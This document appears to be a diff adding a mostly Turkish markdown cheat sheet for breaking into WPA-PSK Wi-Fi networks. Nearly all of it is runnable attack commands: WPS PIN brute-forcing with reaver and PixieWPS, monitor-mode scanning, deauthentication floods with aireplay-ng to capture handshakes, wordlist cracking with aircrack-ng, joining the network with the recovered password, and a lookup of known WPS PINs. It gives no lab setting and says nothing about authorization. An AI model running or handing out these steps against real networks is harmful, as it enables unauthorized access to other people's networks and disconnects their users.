@@ -1,0 +1,70 @@
+## 🔴 WPA-PSK SALDIRISI (XXXX)
+
+### Hazırlık
+```bash
+sudo su
+ip -br -c a
+```
+
+## WPS Attack ##
+
+  wash –i wlan0
+  reaver –b <BSSID> –i wlan0 -vv –S
+  or 
+  for PixieWPS attack you can use "-K" parameter
+  reaver -b 13:06:19:94:00:00 -i wlan0mon -v -K
+
+### Monitor Mod + Tarama
+```bash
+sudo airmon-ng start wlan0
+airodump-ng wlan0mon --band abg
+```
+
+### Hedef Ağı Yakala (BSSID, Channel, Client MAC'i not et!)
+```bash
+airodump-ng wlan0mon --band abg -c [CHANNEL] --wps --bssid [AP_MAC] -w output_file
+```
+
+## Deauthentication Attack ##
+
+  airmon-ng start wlan0
+  airodump-ng –c <channel> --bssid <BSSID> -w <capture_file> wlan0
+  aireplay-ng -0 1 –a <BSSID> -c <client_Mac> wlan0
+
+### Deauth + Handshake Yakala
+```bash
+aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
+# Handshake yakalandığında Ctrl+C ile durdur (Bu saldırı sonucunda airodump-ng çalıştığımız terminalde sağ üst köşede "WPA handshake: 02:13:37:BE:EF:03" yazısı görünür. Bu handshake'i başarıyla yakaladığımız anlamına gelir.
+)
+```
+
+### Parola Kır
+```bash
+aircrack-ng -w /usr/share/john/password.lst output_file-01.cap
+# KEY FOUND! mesajını bekle ve parolayı kaydet
+```
+
+### Bağlan
+```bash
+nano wpa_sup.conf
+```
+```
+network={
+    ssid="[SSID]"
+    scan_ssid=1
+    psk="[PAROLA]"
+    key_mgmt=WPA-PSK
+}
+```
+```bash
+airmon-ng stop wlan0mon
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_sup.conf
+# Yeni terminal aç:
+dhclient wlan0 -v
+```
+
+## Extra - Implementation Variations ##
+
+  sudo apt install airgeddon
+  source /usr/share/airgeddon/known_pins.db
+  echo ${PINDB["0013F7"]}
